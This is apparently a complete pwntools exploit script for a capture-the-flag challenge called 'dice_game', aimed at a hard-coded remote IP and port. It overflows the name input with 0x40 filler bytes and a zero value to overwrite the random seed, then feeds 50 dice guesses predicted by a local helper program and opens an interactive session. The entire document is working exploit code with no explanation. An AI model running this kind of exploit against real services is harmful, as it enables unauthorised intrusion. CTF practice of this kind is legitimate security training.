from pwn import *
context.log_level = 'debug'
#sh=process('./dice_game')
sh=remote('111.198.29.45','32580')
sh.recvuntil('name: ')
pay = 'a'*0x40 + p64(0)
sh.sendline(pay)

p = process('./a.out')
for i in range(50):
	ran = p.recvuntil('\n')
	sh.recvuntil('(1~6): ')
	sh.sendline(ran)

p.close()
#gdb.attach(sh)
sh.interactive()
